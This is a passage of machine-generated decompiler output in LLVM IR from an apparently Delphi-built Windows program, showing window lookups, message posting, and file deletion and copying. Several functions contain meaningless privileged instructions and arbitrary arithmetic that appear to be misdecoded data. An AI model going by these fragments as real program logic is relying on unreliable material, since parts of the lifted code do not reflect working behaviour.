  %stack_var_-64 = alloca i8*, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-28 = alloca i8*, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !1144
  %2 = icmp eq i32 %0, 0, !insn.addr !1145
  store i32 %1, i32* %esp.0.reg2mem, !insn.addr !1146
  br i1 %2, label %dec_label_pc_405eda, label %dec_label_pc_405dea, !insn.addr !1146

dec_label_pc_405dea:                              ; preds = %dec_label_pc_405dd0
  %3 = call i32 @function_4036c8(), !insn.addr !1147
  %4 = inttoptr i32 %3 to i8*, !insn.addr !1148
  store i8* %4, i8** %stack_var_-28, align 4, !insn.addr !1148
  %5 = ptrtoint i8** %stack_var_-28 to i32, !insn.addr !1148
  %6 = call i1 @PathFileExistsA(i8* %4), !insn.addr !1149
  %7 = icmp eq i1 %6, false, !insn.addr !1150
  store i32 %5, i32* %esp.0.reg2mem, !insn.addr !1151
  br i1 %7, label %dec_label_pc_405eda, label %dec_label_pc_405e05, !insn.addr !1151

dec_label_pc_405e05:                              ; preds = %dec_label_pc_405dea
  %8 = load i8*, i8** %stack_var_-28, align 4
  %9 = call i32* @FindWindowExA(i32* null, i32* bitcast ([7 x i8]* @global_var_405ee8 to i32*), i8* null, i8* %8), !insn.addr !1152
  %10 = ptrtoint i32* %9 to i32, !insn.addr !1152
  store i32 %10, i32* %stack_var_-48, align 4, !insn.addr !1153
  %11 = ptrtoint i32* %stack_var_-48 to i32, !insn.addr !1153
  %12 = call i1 @IsWindow(i32* %9), !insn.addr !1154
  %13 = icmp eq i1 %12, false, !insn.addr !1155
  store i32 %11, i32* %esp.0.reg2mem, !insn.addr !1156
  br i1 %13, label %dec_label_pc_405eda, label %dec_label_pc_405e2e, !insn.addr !1156

dec_label_pc_405e2e:                              ; preds = %dec_label_pc_405e05
  %14 = call i32 @function_4034c8(), !insn.addr !1157
  %15 = add i32 %14, 22, !insn.addr !1158
  store i32 66, i32* %stack_var_-56, align 4, !insn.addr !1159
  %16 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1159
  %17 = call i32* @GlobalAlloc(i32 %15, i32 66), !insn.addr !1160
  %18 = icmp eq i32* %17, null, !insn.addr !1161
  store i32 %16, i32* %esp.0.reg2mem, !insn.addr !1162
  br i1 %18, label %dec_label_pc_405eda, label %dec_label_pc_405e4d, !insn.addr !1162

dec_label_pc_405e4d:                              ; preds = %dec_label_pc_405e2e
  %19 = call i32* @GlobalLock(i32* nonnull %17), !insn.addr !1163
  %20 = icmp eq i32* %19, null, !insn.addr !1164
  %21 = icmp eq i1 %20, false, !insn.addr !1165
  br i1 %21, label %dec_label_pc_405e61, label %dec_label_pc_405e59, !insn.addr !1165

dec_label_pc_405e59:                              ; preds = %dec_label_pc_405e4d
  %22 = bitcast i32* %17 to i8*, !insn.addr !1166
  store i8* %22, i8** %stack_var_-64, align 4, !insn.addr !1166
  %23 = ptrtoint i8** %stack_var_-64 to i32, !insn.addr !1166
  %24 = call i32* @GlobalFree(i32* nonnull %17), !insn.addr !1167
  store i32 %23, i32* %esp.0.reg2mem, !insn.addr !1168
  br label %dec_label_pc_405eda, !insn.addr !1168

dec_label_pc_405e61:                              ; preds = %dec_label_pc_405e4d
  %25 = ptrtoint i32* %17 to i32, !insn.addr !1160
  %26 = ptrtoint i32* %19 to i32, !insn.addr !1163
  store i32 20, i32* %19, align 4, !insn.addr !1169
  %27 = add i32 %26, 4, !insn.addr !1170
  %28 = inttoptr i32 %27 to i32*, !insn.addr !1170
  store i32 0, i32* %28, align 4, !insn.addr !1170
  %29 = add i32 %26, 8, !insn.addr !1171
  %30 = inttoptr i32 %29 to i32*, !insn.addr !1171
  store i32 0, i32* %30, align 4, !insn.addr !1171
  %31 = add i32 %26, 12, !insn.addr !1172
  %32 = inttoptr i32 %31 to i32*, !insn.addr !1172
  store i32 0, i32* %32, align 4, !insn.addr !1172
  %33 = add i32 %26, 16, !insn.addr !1173
  %34 = inttoptr i32 %33 to i32*, !insn.addr !1173
  store i32 0, i32* %34, align 4, !insn.addr !1173
  %35 = call i32 @function_4036c8(), !insn.addr !1174
  %36 = inttoptr i32 %35 to i8*, !insn.addr !1175
  store i8* %36, i8** %stack_var_-64, align 4, !insn.addr !1175
  %37 = add i32 %26, 20, !insn.addr !1176
  %38 = inttoptr i32 %37 to i8*, !insn.addr !1177
  %39 = call i8* @lstrcpyA(i8* %36, i8* %38), !insn.addr !1178
  %40 = call i1 @GlobalUnlock(i32* nonnull %17), !insn.addr !1179
  %41 = call i1 @PostMessageA(i32* null, i32 %25, i32 563, i32 %10), !insn.addr !1180
  %42 = call i32 @function_4071e4(i32 4218608, i32 2000, i32 -1), !insn.addr !1181
  store i32 %42, i32* %stack_var_-104, align 4, !insn.addr !1182
  %43 = ptrtoint i32* %stack_var_-104 to i32, !insn.addr !1182
  %44 = inttoptr i32 %42 to i32*, !insn.addr !1183
  %45 = call i1 @IsWindow(i32* %44), !insn.addr !1183
  %46 = icmp eq i1 %45, false, !insn.addr !1184
  store i32 %43, i32* %esp.0.reg2mem, !insn.addr !1185
  br i1 %46, label %dec_label_pc_405eda, label %dec_label_pc_405ecb, !insn.addr !1185

dec_label_pc_405ecb:                              ; preds = %dec_label_pc_405e61
  store i32 %42, i32* %stack_var_-120, align 4, !insn.addr !1186
  %47 = ptrtoint i32* %stack_var_-120 to i32, !insn.addr !1186
  %48 = call i32 @SendMessageA(i32* null, i32 0, i32 245, i32 %42), !insn.addr !1187
  store i32 %47, i32* %esp.0.reg2mem, !insn.addr !1187
  br label %dec_label_pc_405eda, !insn.addr !1187

dec_label_pc_405eda:                              ; preds = %dec_label_pc_405ecb, %dec_label_pc_405e61, %dec_label_pc_405e59, %dec_label_pc_405e2e, %dec_label_pc_405e05, %dec_label_pc_405dea, %dec_label_pc_405dd0
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %49 = add i32 %esp.0.reload, 4, !insn.addr !1188
  %50 = inttoptr i32 %49 to i32*, !insn.addr !1188
  %51 = load i32, i32* %50, align 4, !insn.addr !1188
  ret i32 %51, !insn.addr !1189
}

define i32 @function_405ee5(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_405ee5:
  %ebp.0.reg2mem = alloca i32, !insn.addr !1190
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %ebx = alloca i32, align 4
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %5 = trunc i32 %4 to i8
  %6 = mul i8 %5, 2, !insn.addr !1190
  %7 = inttoptr i32 %4 to i8*, !insn.addr !1190
  store i8 %6, i8* %7, align 1, !insn.addr !1190
  %8 = bitcast i32* %ebx to i8*
  %9 = load i8, i8* %8, align 4, !insn.addr !1191
  %10 = udiv i32 %4, 256, !insn.addr !1191
  %11 = trunc i32 %10 to i8, !insn.addr !1191
  %12 = add i8 %9, %11, !insn.addr !1191
  %13 = load i32, i32* %ebx, align 4, !insn.addr !1191
  %14 = inttoptr i32 %13 to i8*, !insn.addr !1191
  store i8 %12, i8* %14, align 1, !insn.addr !1191
  %15 = and i32 %4, 14
  %16 = icmp ugt i32 %15, 9, !insn.addr !1192
  %17 = add i32 %4, 6, !insn.addr !1192
  %18 = select i1 %16, i32 %17, i32 %4, !insn.addr !1192
  %19 = zext i1 %16 to i32, !insn.addr !1192
  %20 = and i32 %4, -65536, !insn.addr !1192
  %21 = and i32 %18, 14
  %22 = icmp ugt i32 %21, 9, !insn.addr !1193
  %23 = or i1 %16, %22, !insn.addr !1193
  %24 = add i32 %18, 6, !insn.addr !1193
  %25 = select i1 %23, i32 %24, i32 %18, !insn.addr !1193
  %26 = zext i1 %23 to i32, !insn.addr !1193
  %27 = and i32 %25, 15, !insn.addr !1193
  %28 = or i32 %27, %20, !insn.addr !1193
  %reass.add = add nuw nsw i32 %26, %19
  %reass.mul = mul i32 %reass.add, 256
  %29 = add i32 %reass.mul, %4
  %30 = and i32 %29, 65280, !insn.addr !1193
  %31 = or i32 %28, %30, !insn.addr !1193
  %32 = inttoptr i32 %31 to i8*, !insn.addr !1194
  %33 = load i8, i8* %32, align 1, !insn.addr !1194
  %34 = trunc i32 %27 to i8, !insn.addr !1194
  %35 = xor i8 %33, %34, !insn.addr !1194
  store i8 %35, i8* %32, align 1, !insn.addr !1194
  %36 = add i32 %0, 1311123697, !insn.addr !1195
  %37 = inttoptr i32 %36 to i8*, !insn.addr !1195
  %38 = load i8, i8* %37, align 1, !insn.addr !1195
  %39 = udiv i32 %3, 256, !insn.addr !1195
  %40 = trunc i32 %39 to i8, !insn.addr !1195
  %41 = add i8 %38, %40, !insn.addr !1195
  store i8 %41, i8* %37, align 1, !insn.addr !1195
  %42 = inttoptr i32 %31 to i32*, !insn.addr !1196
  %43 = load i32, i32* %42, align 4, !insn.addr !1196
  %44 = sub i32 %43, %31, !insn.addr !1196
  store i32 %44, i32* %42, align 4, !insn.addr !1196
  %45 = add i32 %3, 117, !insn.addr !1197
  %46 = inttoptr i32 %45 to i8*, !insn.addr !1197
  %47 = load i8, i8* %46, align 1, !insn.addr !1197
  %48 = add i8 %47, %34, !insn.addr !1197
  %49 = icmp eq i8 %48, 0, !insn.addr !1197
  store i8 %48, i8* %46, align 1, !insn.addr !1197
  br i1 %49, label %dec_label_pc_405f70, label %dec_label_pc_405efc, !insn.addr !1198

dec_label_pc_405efc:                              ; preds = %dec_label_pc_405ee5
  %50 = xor i32 %3, %1, !insn.addr !1199
  %51 = trunc i32 %3 to i16, !insn.addr !1200
  %52 = inttoptr i32 %50 to i32*, !insn.addr !1200
  %53 = load i32, i32* %52, align 4, !insn.addr !1200
  call void @__asm_outsd(i16 %51, i32 %53), !insn.addr !1200
  %54 = inttoptr i32 %50 to i8*, !insn.addr !1201
  %55 = load i8, i8* %54, align 1, !insn.addr !1201
  call void @__asm_outsb(i16 %51, i8 %55), !insn.addr !1201
  %56 = load i8, i8* %32, align 1, !insn.addr !1202
  %57 = add i8 %56, %34, !insn.addr !1202
  store i8 %57, i8* %32, align 1, !insn.addr !1202
  %58 = call i32 @__asm_iretd(), !insn.addr !1203
  %59 = add i32 %2, -117, !insn.addr !1204
  %60 = inttoptr i32 %59 to i8*, !insn.addr !1204
  %61 = load i8, i8* %60, align 1, !insn.addr !1204
  %62 = add i8 %61, -69, !insn.addr !1204
  store i8 %62, i8* %60, align 1, !insn.addr !1204
  %63 = call i8 @__asm_in(i16 -11077), !insn.addr !1205
  %64 = call i32 @__readfsdword(i32 0), !insn.addr !1206
  store i32 %64, i32* %stack_var_-12, align 4, !insn.addr !1206
  %65 = ptrtoint i32* %stack_var_-12 to i32, !insn.addr !1206
  call void @__writefsdword(i32 0, i32 %65), !insn.addr !1207
  %66 = load i32, i32* @global_var_4096c4, align 4, !insn.addr !1208
  %67 = add i32 %66, 1, !insn.addr !1208
  store i32 %67, i32* @global_var_4096c4, align 4, !insn.addr !1208
  %68 = load i32, i32* %stack_var_-12, align 4, !insn.addr !1209
  call void @__writefsdword(i32 0, i32 %68), !insn.addr !1210
  ret i32 0, !insn.addr !1211

dec_label_pc_405f70:                              ; preds = %dec_label_pc_405ee5
  %69 = call i32 @function_403c90(), !insn.addr !1212
  store i32 %69, i32* %ebx, align 4, !insn.addr !1213
  %70 = icmp slt i32 %69, 0, !insn.addr !1214
  br i1 %70, label %dec_label_pc_405f98, label %dec_label_pc_405f80, !insn.addr !1215

dec_label_pc_405f80:                              ; preds = %dec_label_pc_405f70
  %71 = add i32 %69, 1, !insn.addr !1216
  store i32 %71, i32* %ebx, align 4, !insn.addr !1216
  %72 = call i32 @"@LStrCmp"(), !insn.addr !1217
  br label %dec_label_pc_405fd9

dec_label_pc_405f98:                              ; preds = %dec_label_pc_405f70
  %73 = call i32 @function_403c88(), !insn.addr !1218
  %74 = call i32 @"@DynArraySetLength"(), !insn.addr !1219
  %75 = call i32 @function_403c90(), !insn.addr !1220
  %76 = call i32 @"@LStrAsg"(), !insn.addr !1221
  store i32 -1, i32* %ebp.0.reg2mem, !insn.addr !1222
  br label %dec_label_pc_405fd9, !insn.addr !1222

dec_label_pc_405fd9:                              ; preds = %dec_label_pc_405f80, %dec_label_pc_405f98
  %ebp.0.reload = load i32, i32* %ebp.0.reg2mem
  ret i32 %ebp.0.reload, !insn.addr !1223
}

define i32 @function_405fe0() local_unnamed_addr {
dec_label_pc_405fe0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1224
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1224
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1224
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1225
  %2 = load i32, i32* @global_var_4096c8, align 4, !insn.addr !1226
  %3 = add i32 %2, 1, !insn.addr !1226
  %4 = icmp eq i32 %3, 0, !insn.addr !1226
  store i32 %3, i32* @global_var_4096c8, align 4, !insn.addr !1226
  %5 = icmp eq i1 %4, false, !insn.addr !1227
  br i1 %5, label %dec_label_pc_406009, label %dec_label_pc_405ff9, !insn.addr !1227

dec_label_pc_405ff9:                              ; preds = %dec_label_pc_405fe0
  %6 = call i32 @"@DynArrayClear"(), !insn.addr !1228
  br label %dec_label_pc_406009, !insn.addr !1228

dec_label_pc_406009:                              ; preds = %dec_label_pc_405ff9, %dec_label_pc_405fe0
  %7 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1229
  call void @__writefsdword(i32 0, i32 %7), !insn.addr !1230
  ret i32 0, !insn.addr !1231
}

define i32 @function_406017() local_unnamed_addr {
dec_label_pc_406017:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1232
  ret i32 %0, !insn.addr !1232
}

define i32 @function_40601c() local_unnamed_addr {
dec_label_pc_40601c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1233
}

define i32 @function_40601e(i32 %arg1) local_unnamed_addr {
dec_label_pc_40601e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1234
}

define i32 @function_406020() local_unnamed_addr {
dec_label_pc_406020:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1235
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1235
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1235
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1236
  %2 = load i32, i32* @global_var_4096c8, align 4, !insn.addr !1237
  %3 = add i32 %2, -1, !insn.addr !1237
  %4 = icmp eq i32 %2, 0, !insn.addr !1237
  store i32 %3, i32* @global_var_4096c8, align 4, !insn.addr !1237
  %5 = icmp eq i1 %4, false, !insn.addr !1238
  br i1 %5, label %dec_label_pc_406054, label %dec_label_pc_40603a, !insn.addr !1238

dec_label_pc_40603a:                              ; preds = %dec_label_pc_406020
  %6 = call i32 @"@DynArraySetLength"(), !insn.addr !1239
  br label %dec_label_pc_406054, !insn.addr !1240

dec_label_pc_406054:                              ; preds = %dec_label_pc_40603a, %dec_label_pc_406020
  %7 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1241
  call void @__writefsdword(i32 0, i32 %7), !insn.addr !1242
  ret i32 0, !insn.addr !1243
}

define i32 @function_406062() local_unnamed_addr {
dec_label_pc_406062:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1244
  ret i32 %0, !insn.addr !1244
}

define i32 @function_406067() local_unnamed_addr {
dec_label_pc_406067:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1245
}

define i32 @function_406069(i32 %arg1) local_unnamed_addr {
dec_label_pc_406069:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1246
}

define i32 @function_40606c(i32 %arg1) local_unnamed_addr {
dec_label_pc_40606c:
  %esp.0.reg2mem = alloca i32, !insn.addr !1247
  %of.0.reg2mem = alloca i1, !insn.addr !1247
  %.reg2mem6 = alloca i8, !insn.addr !1247
  %.reg2mem = alloca i32, !insn.addr !1247
  %esi = alloca i32, align 4
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = call i1 @__decompiler_undefined_function_4()
  %6 = call i1 @__decompiler_undefined_function_4()
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-20 = alloca i8*, align 4
  %stack_var_-4 = alloca i32, align 4
  call void @__asm_into(i32 %4), !insn.addr !1247
  %7 = trunc i32 %2 to i8, !insn.addr !1248
  %8 = and i8 %7, 31, !insn.addr !1248
  %9 = icmp eq i8 %8, 0, !insn.addr !1248
  br i1 %9, label %dec_label_pc_40606c._crit_edge, label %11, !insn.addr !1248

dec_label_pc_40606c._crit_edge:                   ; preds = %dec_label_pc_40606c
  %10 = trunc i32 %0 to i8
  store i8 %10, i8* %.reg2mem6
  br label %21

; <label>:11:                                     ; preds = %dec_label_pc_40606c
  %12 = add i32 %1, -959064636, !insn.addr !1248
  %13 = inttoptr i32 %12 to i8*, !insn.addr !1248
  %14 = load i8, i8* %13, align 1, !insn.addr !1248
  %15 = shl i8 %14, %8, !insn.addr !1248
  store i8 %15, i8* %13, align 1, !insn.addr !1248
  %16 = add nsw i8 %8, -1, !insn.addr !1248
  %17 = shl i8 %14, %16, !insn.addr !1248
  %.unshifted = xor i8 %15, %17
  %18 = icmp slt i8 %.unshifted, 0, !insn.addr !1248
  %19 = icmp eq i8 %8, 1, !insn.addr !1248
  %20 = select i1 %19, i1 %18, i1 %5, !insn.addr !1248
  %.phi.trans.insert = bitcast i32* %esi to i8*
  %.pre = load i8, i8* %.phi.trans.insert, align 4
  %.pre4 = load i32, i32* %esi, align 4
  store i32 %.pre4, i32* %.reg2mem, !insn.addr !1248
  store i8 %.pre, i8* %.reg2mem6, !insn.addr !1248
  store i1 %20, i1* %of.0.reg2mem, !insn.addr !1248
  br label %21, !insn.addr !1248

; <label>:21:                                     ; preds = %dec_label_pc_40606c._crit_edge, %11
  %of.0.reload = load i1, i1* %of.0.reg2mem
  %.reload7 = load i8, i8* %.reg2mem6, !insn.addr !1249
  %.reload = load i32, i32* %.reg2mem, !insn.addr !1249
  %22 = zext i8 %.reload7 to i32, !insn.addr !1249
  %23 = and i32 %3, -256, !insn.addr !1249
  %24 = or i32 %23, %22, !insn.addr !1249
  %25 = select i1 %6, i32 -1, i32 1, !insn.addr !1249
  %26 = add i32 %.reload, %25, !insn.addr !1249
  store i32 %26, i32* %esi, align 4, !insn.addr !1249
  %27 = inttoptr i32 %24 to i8*
  %28 = load i8, i8* %27, align 1
  %29 = add i8 %28, %.reload7
  br i1 %of.0.reload, label %dec_label_pc_4060e0, label %dec_label_pc_406077, !insn.addr !1250

dec_label_pc_406077:                              ; preds = %21
  %factor = mul i8 %.reload7, 27
  %30 = add i8 %29, %factor, !insn.addr !1251
  store i8 %30, i8* %27, align 1, !insn.addr !1251
  store i8* null, i8** %stack_var_-20, align 4, !insn.addr !1252
  %31 = call i32 @__readfsdword(i32 0), !insn.addr !1253
  store i32 %31, i32* %stack_var_-48, align 4, !insn.addr !1253
  %32 = ptrtoint i32* %stack_var_-48 to i32, !insn.addr !1253
  call void @__writefsdword(i32 0, i32 %32), !insn.addr !1254
  %33 = call i32 @GetClassLongA(i32* inttoptr (i32 -1 to i32*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1255
  ret i32 %33, !insn.addr !1255

dec_label_pc_4060e0:                              ; preds = %21
  %34 = icmp eq i8 %29, 0, !insn.addr !1256
  store i8 %29, i8* %27, align 1, !insn.addr !1256
  %35 = icmp eq i1 %34, false, !insn.addr !1257
  br i1 %35, label %dec_label_pc_406194, label %dec_label_pc_4060e8, !insn.addr !1257

dec_label_pc_4060e8:                              ; preds = %dec_label_pc_4060e0
  %36 = call i32 @function_4072d8(), !insn.addr !1258
  %37 = call i32 @"@LStrPos"(), !insn.addr !1259
  %38 = call i32 @"@LStrPos"(), !insn.addr !1260
  %39 = add i32 %38, -1, !insn.addr !1261
  %40 = icmp slt i32 %39, 0, !insn.addr !1262
  %41 = add i32 %37, 2, !insn.addr !1263
  %42 = icmp sgt i32 %41, %39, !insn.addr !1264
  %or.cond = or i1 %40, %42
  br i1 %or.cond, label %dec_label_pc_406194, label %dec_label_pc_40611c, !insn.addr !1265

dec_label_pc_40611c:                              ; preds = %dec_label_pc_4060e8
  %43 = add i32 %1, -12, !insn.addr !1266
  store i32 %43, i32* %stack_var_-4, align 4, !insn.addr !1267
  %44 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !1267
  %45 = call i32 @"@LStrCopy"(), !insn.addr !1268
  %46 = inttoptr i32 %43 to i32*, !insn.addr !1269
  %47 = load i32, i32* %46, align 4, !insn.addr !1269
  %48 = icmp eq i32 %47, 0, !insn.addr !1269
  store i32 %44, i32* %esp.0.reg2mem, !insn.addr !1270
  br i1 %48, label %dec_label_pc_406194, label %dec_label_pc_406144, !insn.addr !1270

dec_label_pc_406144:                              ; preds = %dec_label_pc_40611c
  %49 = call i32 @function_4070c0(), !insn.addr !1271
  %50 = call i32 @"@LStrFromPChar"(), !insn.addr !1272
  %51 = call i32 @"@LStrCat"(), !insn.addr !1273
  %52 = call i32 @function_4036c8(), !insn.addr !1274
  %53 = inttoptr i32 %52 to i8*, !insn.addr !1275
  %54 = call i1 @DeleteFileA(i8* %53), !insn.addr !1276
  %55 = call i32 @function_4036c8(), !insn.addr !1277
  %56 = inttoptr i32 %55 to i8*, !insn.addr !1278
  store i8* %56, i8** %stack_var_-20, align 4, !insn.addr !1278
  %57 = ptrtoint i8** %stack_var_-20 to i32, !insn.addr !1278
  %58 = call i1 @CopyFileA(i8* %56, i8* bitcast (i32* @0 to i8*), i1 ptrtoint (i32* @0 to i1)), !insn.addr !1279
  %59 = call i32 @function_405dd0(), !insn.addr !1280
  store i32 %57, i32* %esp.0.reg2mem, !insn.addr !1280
  br label %dec_label_pc_406194, !insn.addr !1280

dec_label_pc_406194:                              ; preds = %dec_label_pc_406144, %dec_label_pc_40611c, %dec_label_pc_4060e8, %dec_label_pc_4060e0
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %60 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !1281
  %61 = load i32, i32* %60, align 4, !insn.addr !1281
  call void @__writefsdword(i32 0, i32 %61), !insn.addr !1282
  %62 = add i32 %esp.0.reload, 8, !insn.addr !1283
  %63 = inttoptr i32 %62 to i32*, !insn.addr !1283
  store i32 4219318, i32* %63, align 4, !insn.addr !1283
  %64 = call i32 @"@LStrArrayClr"(), !insn.addr !1284
  ret i32 %64, !insn.addr !1285
}

define i32 @function_4061af() local_unnamed_addr {
dec_label_pc_4061af:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1286
  ret i32 %0, !insn.addr !1286
}

define i32 @function_4061b4() local_unnamed_addr {
dec_label_pc_4061b4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1287
}

define i32 @function_4061b6(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4061b6:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !1288
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1288
  %3 = load i32, i32* %2, align 4, !insn.addr !1288
  ret i32 %3, !insn.addr !1289
}

define i32 @function_4061c7() local_unnamed_addr {
dec_label_pc_4061c7:
  %0 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %1 = add i32 %0, 1, !insn.addr !1290
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1290
  store i32 %1, i32* %2, align 4, !insn.addr !1290
  %3 = bitcast i32* %eax to i8*
  %4 = load i8, i8* %3, align 4, !insn.addr !1291
  %5 = load i32, i32* %eax, align 4
  %6 = trunc i32 %5 to i8, !insn.addr !1291
  %7 = add i8 %4, %6, !insn.addr !1291
  %8 = inttoptr i32 %5 to i8*, !insn.addr !1291
  store i8 %7, i8* %8, align 1, !insn.addr !1291
  %9 = load i32, i32* %eax, align 4, !insn.addr !1292
  ret i32 %9, !insn.addr !1292
}

define i32 @function_4061d6() local_unnamed_addr {
dec_label_pc_4061d6:
  %0 = call i32 @__decompiler_undefined_function_0()
  %edx = alloca i32, align 4
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = trunc i32 %2 to i8
  %4 = mul i8 %3, 2, !insn.addr !1293
  %5 = inttoptr i32 %2 to i8*, !insn.addr !1293
  store i8 %4, i8* %5, align 1, !insn.addr !1293
  %6 = mul i32 %0, 4096, !insn.addr !1294
  %7 = udiv i32 %0, 1048576, !insn.addr !1294
  %8 = or i32 %7, %6, !insn.addr !1294
  %9 = and i32 %0, 1048576, !insn.addr !1294
  %10 = icmp eq i32 %9, 0, !insn.addr !1294
  %11 = load i32, i32* %edx, align 4, !insn.addr !1295
  %12 = trunc i32 %11 to i16, !insn.addr !1295
  %13 = call i8 @__asm_in(i16 %12), !insn.addr !1295
  %14 = sext i8 %13 to i32, !insn.addr !1295
  %15 = or i32 %2, %14, !insn.addr !1295
  %16 = select i1 %10, i32 0, i32 255, !insn.addr !1296
  %17 = and i32 %15, -256, !insn.addr !1296
  %18 = or i32 %17, %16, !insn.addr !1296
  %19 = inttoptr i32 %18 to i8*, !insn.addr !1297
  %20 = load i8, i8* %19, align 1, !insn.addr !1297
  %21 = mul i8 %20, 2, !insn.addr !1297
  %22 = lshr i8 %20, 7, !insn.addr !1297
  %23 = or i8 %22, %21, !insn.addr !1297
  store i8 %23, i8* %19, align 1, !insn.addr !1297
  %24 = bitcast i32* %edx to i8*
  %25 = load i8, i8* %24, align 4, !insn.addr !1298
  %26 = udiv i32 %1, 256, !insn.addr !1298
  %27 = trunc i32 %26 to i8, !insn.addr !1298
  %28 = add i8 %25, %27, !insn.addr !1298
  %29 = load i32, i32* %edx, align 4, !insn.addr !1298
  %30 = inttoptr i32 %29 to i8*, !insn.addr !1298
  store i8 %28, i8* %30, align 1, !insn.addr !1298
  %31 = add i32 %8, -4, !insn.addr !1299
  %32 = inttoptr i32 %31 to i32*, !insn.addr !1299
  store i32 4219056, i32* %32, align 4, !insn.addr !1299
  %33 = call i1 @EnumWindows(i1 (i32*, i32)* bitcast (i32* @0 to i1 (i32*, i32)*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1300
  %34 = sext i1 %33 to i32, !insn.addr !1300
  ret i32 %34, !insn.addr !1301
}

define i32 @function_4061e0(i32 %arg1) local_unnamed_addr {
dec_label_pc_4061e0:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0
}

define i32 @function_4061f0() local_unnamed_addr {
dec_label_pc_4061f0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1302
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1302
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1302
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1303
  %2 = load i32, i32* @global_var_4096d0, align 4, !insn.addr !1304
  %3 = add i32 %2, 1, !insn.addr !1304
  store i32 %3, i32* @global_var_4096d0, align 4, !insn.addr !1304
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1305
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1306
  ret i32 0, !insn.addr !1307
}

define i32 @function_406215() local_unnamed_addr {
dec_label_pc_406215:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1308
  ret i32 %0, !insn.addr !1308
}

define i32 @function_40621a() local_unnamed_addr {
dec_label_pc_40621a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1309
}

define i32 @function_40621c(i32 %arg1) local_unnamed_addr {
dec_label_pc_40621c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1310
}

define i32 @function_406220() local_unnamed_addr {
dec_label_pc_406220:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096d0, align 4, !insn.addr !1311
  %2 = add i32 %1, -1, !insn.addr !1311
  store i32 %2, i32* @global_var_4096d0, align 4, !insn.addr !1311
  ret i32 %0, !insn.addr !1312
}

define i32 @function_406228() local_unnamed_addr {
dec_label_pc_406228:
  %eax.0.reg2mem = alloca i32, !insn.addr !1313
  %0 = call i32 @function_40629c(), !insn.addr !1314
  %1 = load i32, i32* @global_var_40812c, align 4
  %2 = icmp eq i32 %1, 0, !insn.addr !1315
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !1316
  br i1 %2, label %dec_label_pc_40625c, label %dec_label_pc_40623a, !insn.addr !1316

dec_label_pc_40623a:                              ; preds = %dec_label_pc_406228
  %3 = load i32, i32* inttoptr (i32 4227412 to i32*), align 4, !insn.addr !1317
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1318
  %5 = load i32, i32* %4, align 4, !insn.addr !1318
  %6 = icmp eq i32 %5, 0, !insn.addr !1318
  store i32 %3, i32* %eax.0.reg2mem, !insn.addr !1319
  br i1 %6, label %dec_label_pc_40625c, label %dec_label_pc_406244, !insn.addr !1319

dec_label_pc_406244:                              ; preds = %dec_label_pc_40623a
